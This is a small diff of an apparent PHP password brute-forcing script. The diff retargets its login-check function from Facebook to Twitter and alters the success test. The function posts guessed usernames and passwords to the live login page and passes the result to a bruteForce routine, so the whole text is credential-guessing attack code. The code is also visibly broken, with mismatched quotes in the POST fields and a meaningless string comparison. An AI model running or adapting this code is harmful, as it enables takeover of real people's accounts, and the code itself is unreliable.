@@ -42,7 +42,7 @@ echo "</body>
 </html>";
 function check_correct($username, $Pass)
 {
-	$c = curl_init('https://www.facebook.com/login');
+	$c = curl_init('https://twitter.com');
         curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
         curl_setopt($c, CURLOPT_POST, 1);
         curl_setopt($c, CURLOPT_POSTFIELDS, "session[username_or_email]='.$username.'&session[password]='.$Pass.'");
@@ -53,7 +53,7 @@ function check_correct($username, $Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 0); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
-	if($str != "Followers") {return true;}
+	if($str > "Followers") {return true;}
         else {return false;}
 }
 bruteForce($username, $Pass1);
